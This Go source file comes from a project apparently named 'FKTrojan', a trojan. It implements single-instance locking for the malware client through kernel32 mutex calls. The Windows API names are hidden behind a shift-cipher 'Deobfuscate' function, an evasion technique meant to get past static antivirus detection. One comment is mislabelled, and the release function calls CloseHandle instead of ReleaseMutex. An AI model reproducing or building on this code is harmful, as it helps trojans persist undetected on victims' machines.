package client_singleton

import (
	"FKTrojan/common"
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32         = syscall.NewLazyDLL(common.Deobfuscate("lfsofm43/emm")) //kernel32.dll
	procCreateMutex  = kernel32.NewProc(common.Deobfuscate("DsfbufNvufyX"))   //CreateMutexW
	procReleaseMutex = kernel32.NewProc(common.Deobfuscate("SfmfbtfNvufy"))   //ReleaseMutex
	procCloseHandle  = kernel32.NewProc(common.Deobfuscate("DmptfIboemf"))    //ReleaseMutex
)

func createMutex(name string) (uintptr, error) {
	b, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return 0, err
	}
	ret, _, err := procCreateMutex.Call(
		0,
		1,
		uintptr(unsafe.Pointer(b)),
	)
	switch int(err.(syscall.Errno)) {
	case 0:
		return ret, nil
	default:
		return ret, err
	}
}
func releaseMutex(u uintptr) error {
	ret, _, err := procCloseHandle.Call(u)
	fmt.Println(err)
	if ret != 1 {
		return fmt.Errorf("ret is %d err is %v", ret, err)
	}
	return nil
}
